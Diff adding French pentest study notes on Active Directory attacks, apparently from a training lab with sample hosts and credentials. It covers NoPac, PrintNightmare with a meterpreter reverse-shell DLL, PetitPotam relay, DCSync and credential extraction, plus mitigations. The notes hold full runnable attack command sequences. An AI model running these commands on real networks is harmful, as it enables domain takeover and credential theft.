@@ -1609,5 +1609,316 @@ Permet d’utiliser des outils type PowerView sans avoir à repasser un credenti
 
 --- 
 
+# Bleeding Edge Vulnerabilities (AD Attacks 2021-2022)
+
+## Pourquoi tester ces attaques ?
+Les patchs ne sont pas déployés rapidement partout. Ça laisse de la place pour des attaques “zero-day-like” sur AD.
+Les techniques suivantes étaient “bleeding edge” en 2022 mais restent souvent exploitables dans les environnements réels.
+⚠️ Même si elles sont moins destructrices que Zerologon/DCShadow, rester prudent en prod : crash du spooler possible avec PrintNightmare par exemple.
+
+## NoPac (SamAccountName Spoofing / SamTheAdmin)
+- CVE-2021-42278 + CVE-2021-42287
+- Permet à un **utilisateur du domaine standard** de s’auto-élever DA (Domain Admin) sur AD vulnérable.
+- Exploitation : possibilité de renommer le `SamAccountName` d’un compte machine pour matcher un DC.
+
+### Préparation
+- Installer Impacket :
+  
+  - `git clone https://github.com/SecureAuthCorp/impacket.git`
+  - `python setup.py install`
+    
+- Cloner le repo noPac :
+  
+  - `git clone https://github.com/Ridter/noPac.git`
+
+### Scan de vulnérabilité
+- `sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap`
+- Vérifier si `ms-DS-MachineAccountQuota` > 0 (par défaut = 10, si 0 = attaque impossible).
+
+### Exploitation / Prise de shell SYSTEM
+- `sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap`
+- Génére un compte machine, renomme son sAMAccountName = nom DC, récupère un TGT “admin”, lance un shell `smbexec`.
+
+### Dump DCSync direct :
+- `sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator`
+
+### Tickets ccache
+- Après l’exploit, fichier `.ccache` généré dans le dossier (ex : `administrator_DC01.INLANEFREIGHT.local.ccache`)
+- Peut être utilisé pour “Pass-The-Ticket”/DCSync.
+
+## PrintNightmare (CVE-2021-34527, CVE-2021-1675)
+
+### Objectif
+Privesc ou RCE via Print Spooler sur DC ou hôte Windows vulnérable.
+
+### Préparation
+- Cloner l’exploit :
+  
+  `git clone https://github.com/cube0x0/CVE-2021-1675.git`
+
+- Installer la version modifiée d’Impacket :
+  
+  - `pip3 uninstall impacket`
+  - `git clone https://github.com/cube0x0/impacket`
+  - `cd impacket && python3 ./setup.py install`
+
+### Vérifier exposé RPRN
+- `rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'`
+
+### Générer la DLL payload
+- `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll`
+
+### Héberger le payload sur SMB
+- `sudo smbserver.py -smb2support CompData /path/to/backupscript.dll`
+
+### Lancer handler sur MSF
+- `use exploit/multi/handler`
+- `set PAYLOAD windows/x64/meterpreter/reverse_tcp`
+- `set LHOST 172.16.5.225`
+- `set LPORT 8080`
+- `run`
+
+### Exploit
+- `sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'`
+
+### Après succès :  
+- Meterpreter shell SYSTEM : `whoami` = `nt authority\system`
+
+## PetitPotam (CVE-2021-36942, MS-EFSRPC, ADCS Abuse)
+
+### Objectif
+Forcer le DC à s’authentifier sur un serveur relai (attaque NTLM relay sur AD CS), obtenir un certificat DC, puis TGT, puis DCSync.
+
+### Lancer le relai
+- `sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController`
+
+### Déclencher l’authent via PetitPotam
+- `python3 PetitPotam.py 172.16.5.225 172.16.5.5`
+
+#### (Alternatives : Invoke-PetitPotam.ps1, mimikatz `misc::efs /server:DC /connect:ATTACKHOST`)
+
+### Si succès : récupération d’un certificat Base64
+
+### Obtenir un TGT pour le DC
+- `python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 <base64_cert> dc01.ccache`
+
+### Utiliser le TGT (Linux)
+- `export KRB5CCNAME=dc01.ccache`
+- `klist` (doit afficher le ticket du DC)
+
+### DCSync avec ce TGT
+- `secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL`
+- ou : `secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL`
+
+### Utiliser le hash pour takeover
+- `crackmapexec smb 172.16.5.5 -u administrator -H <ntlm_hash>`
+
+### Extra : Récupérer NTLM avec getnthash.py
+- `python /opt/PKINITtools/getnthash.py -key <asrep_key> INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$`
+  
+- Puis :
+  
+  `secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:<ntlm_hash>`
+
+
+## Version Windows / Rubeus
+
+- `Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:<base64_cert> /ptt`
+- Confirmer via : `klist`
+  
+- Puis DCSync via Mimikatz :
+  
+  - `lsadump::dcsync /user:inlanefreight\krbtgt`
+
+## Défenses et mitigations
+
+- **NoPac** : patch, ou mettre `ms-DS-MachineAccountQuota` à 0.
+- **PrintNightmare** : patch tous les serveurs + désactiver spooler sur les serveurs critiques.
+- **PetitPotam/ADCS Abuse** :  
+  - Patch CVE-2021-36942  
+  - Restreindre l’accès à ADCS web enroll, forcer HTTPS  
+  - Désactiver NTLM sur les DC/serveurs CA  
+  - Voir : [Certified Pre-Owned whitepaper](https://research.ifcr.dk/certified-pre-owned/)
+
+## Récap des attaques présentées
+
+- **NoPac** : privesc Domain Admin depuis utilisateur standard (exploite sAMAccountName spoof + Kerberos PAC)
+- **PrintNightmare** : privesc/RCE via Print Spooler vulnérable (SYSTEM sur DC)
+- **PetitPotam** : takeover du domaine via relai NTLM, abuse d’ADCS pour obtenir TGT DC → DCSync
+
+---
+
+# Miscellaneous Misconfigurations (Active Directory)
+
+Diverses attaques et mauvaises configurations supplémentaires sont régulièrement rencontrées lors d’audits Active Directory. Une bonne compréhension de l’architecture AD permet d’identifier des failles souvent négligées.
+
+## Exchange : Groupes et Délégations
+
+### Exchange Windows Permissions
+
+- Ce groupe dispose du droit de modifier la DACL de l’objet domaine.
+- L’ajout d’un utilisateur à ce groupe permet d’obtenir les privilèges DCSync (dump NTDS).
+- Les comptes Account Operators peuvent ajouter des membres à ce groupe via une mauvaise DACL.
+- Ressource détaillée :  
+  - [PrivExchange GitHub - PrivExchange Attack](https://github.com/dirkjanm/PrivExchange)
+  - [Abusing Exchange - techniques by Dirk-jan Mollema](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/)
+
+### Organization Management
+
+- Groupe très puissant, accès à toutes les boîtes mail et contrôle sur l’OU Microsoft Exchange Security Groups.
+- Compromission d’un serveur Exchange conduit souvent à Domain Admin.
+- Dump mémoire sur Exchange : souvent présence de nombreux mots de passe ou NTLM hash en clair, à cause de la connexion OWA.
+
+## PrivExchange (PushSubscription, relai LDAP)
+
+- Vulnérabilité Exchange (avant CU 2019) : possibilité de forcer Exchange (SYSTEM) à s’authentifier sur un hôte de l’attaquant.
+- Relai possible vers LDAP : récupération DCSync.
+- Toute personne avec une mailbox Exchange peut déclencher l’attaque.
+
+Voir : [PrivExchange GitHub](https://github.com/dirkjanm/PrivExchange)
+
+## Printer Bug (MS-RPRN protocol)
+
+- Permet à tout utilisateur de forcer le spooler à s’authentifier sur un hôte SMB/LDAP de l’attaquant via RpcRemoteFindFirstPrinterChangeNotificationEx.
+- Utilisable pour :  
+  - Relayer sur LDAP et obtenir DCSync
+  - Attribuer des droits RBCD (Resource-Based Constrained Delegation)
+- Outils de détection :  
+  - [GhostPack/SecurityAssessment](https://github.com/GhostPack/Seatbelt) (module Get-SpoolStatus)
+  - [SpoolSample de laura89](https://github.com/leechristensen/SpoolSample)
+
+#### Exemple de détection
+```powershell
+Import-Module .\SecurityAssessment.ps1
+Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+```
+
+## MS14-068 (Kerberos PAC Forgery)
+
+- Vulnérabilité du ticket Kerberos : possible de forger un PAC validé comme authentique par le KDC.
+- Permet de s’attribuer les droits Domain Admin.
+- Exploitable par [PyKEK](https://github.com/bidord/pykek) ou [Impacket](https://github.com/SecureAuthCorp/impacket).
+- Défense : patch obligatoire.  
+- Démonstration sur la machine HTB "Mantis" : https://www.hackthebox.com/starting-point/machines/mantis
+
+## Sniffing LDAP Credentials
+
+- De nombreux dispositifs/applications stockent des identifiants LDAP en clair dans l’interface d’admin ou permettent de rediriger l’authentification vers un serveur contrôlé par l’attaquant (test de connexion).
+- Les identifiants LDAP récupérés sont parfois hautement privilégiés.
+- Voir exemple détaillé :  
+  - [Hunting for credentials - blog by Oddvar Moe](https://msitpros.com/?p=3960)
+
+## Enumération DNS via adidnsdump
+
+- Par défaut, tous les utilisateurs AD peuvent lister les objets enfants d’une zone DNS AD.
+- L’outil [adidnsdump](https://github.com/dirkjanm/adidnsdump) permet de récupérer tous les enregistrements, même "cachés" (non descriptifs).
+
+```bash
+adidnsdump -u inlanefreight\\forend ldap://172.16.5.5
+adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
+```
+
+Voir l’article explicatif :  
+- [Active Directory Integrated DNS Dumping](https://dirkjanm.io/abusing-active-directory-integrated-dns/)
+
+## Mot de passe dans la description (AD User)
+
+- Parfois, des mots de passe figurent dans le champ description ou notes d’un compte utilisateur.
+- Extraction rapide via PowerView :
+```powershell
+Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.Description -ne $null}
+```
+
+## Comptes PASSWD_NOTREQD
+
+- Attribut userAccountControl : si PASSWD_NOTREQD est présent, le compte n’est pas soumis à la politique de longueur de mot de passe.
+- Certains comptes peuvent avoir un mot de passe vide ou très faible.
+- Extraction :
+```powershell
+Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
+```
+## Recherche de credentials dans SYSVOL et partages SMB
+
+- Scripts présents sur `\\<dc>\SYSVOL\<domain>\scripts` : batch, PowerShell, VBS…
+- Exemple de fichier intéressant :
+```powershell
+cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs
+```
+- Tester ensuite le mot de passe récupéré via CrackMapExec avec `--local-auth`.
+
+## Group Policy Preferences (GPP) Passwords
+
+- Les fichiers `.xml` dans SYSVOL (ex : groups.xml, services.xml) peuvent contenir des mots de passe chiffrés avec cpassword (AES-256).
+- La clé privée AES a été publiée par Microsoft (voir [MSDN GPP AES Key](https://github.com/denandz/GPP-Decrypt/blob/master/gppref/aes.c)).
+- Outils de récupération :
+    - [gpp-decrypt](https://github.com/mbcrump/gpp-decrypt)
+    - [Get-GPPPassword.ps1](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/functions/Recon/Get-GPPPassword.ps1)
+    - [CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec) (modules gpp_password, gpp_autologin)
+- Exemple déchiffrement :
+```bash
+gpp-decrypt <cpassword>
+```
+## GPP Autologon
+
+- Fichier Registry.xml : stockage possible de credentials autologon en clair via GPP.
+- Extraction :
+```bash
+crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
+```
+- Script complémentaire : [Get-GPPAutologon.ps1 (PowerSploit)](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/Get-GPPAutologon.ps1)
+
+## ASREPRoasting (Do not require Kerberos pre-auth)
+
+- Si l’attribut "Do not require Kerberos pre-authentication" est activé, il est possible de récupérer un AS-REP chiffré avec le mot de passe utilisateur.
+- Extraction (PowerView) :
+```powershell
+Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
+```
+- Extraction du hash (Rubeus) :
+```powershell
+.\Rubeus.exe asreproast /user:<user> /nowrap /format:hashcat
+```
+- Brute-force offline :
+```bash
+hashcat -m 18200 <fichier_hash> <wordlist>
+```
+- Alternative découverte :  
+    - [Kerbrute](https://github.com/ropnop/kerbrute)
+    - [GetNPUsers.py - Impacket](https://github.com/SecureAuthCorp/impacket)
+
+## GPO (Group Policy Object) Abuse
+
+- Droits WriteDacl/GenericWrite/WriteOwner sur un GPO : permettent d’abuser le GPO pour élévation de privilèges ou persistance.
+- Enumération des GPO :
+```powershell
+Get-DomainGPO | select displayname
+Get-GPO -All | Select DisplayName
+```
+- Vérification des droits d’un utilisateur/groupe sur les GPO :
+```powershell
+$sid=Convert-NameToSid "Domain Users"
+Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
+```
+- Conversion GUID → nom :
+```powershell
+Get-GPO -Guid <guid>
+```
+- Abus automatisé :  
+    - [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse)
+    - [BloodHound](https://github.com/BloodHoundAD/BloodHound)
+
+## Autres axes à étudier
+
+- Active Directory Certificate Services (AD CS) attacks :  
+    - Voir l’article "Certified Pre-Owned" ([SpecterOps whitepaper](https://specterops.io/wp-content/uploads/sites/3/2022/03/Certified_Pre-Owned.pdf))
+- Kerberos Constrained Delegation (KCD)
+- Kerberos Unconstrained Delegation
+- Kerberos Resource-Based Constrained Delegation (RBCD)
+
+---
+
+
+
+
 
 
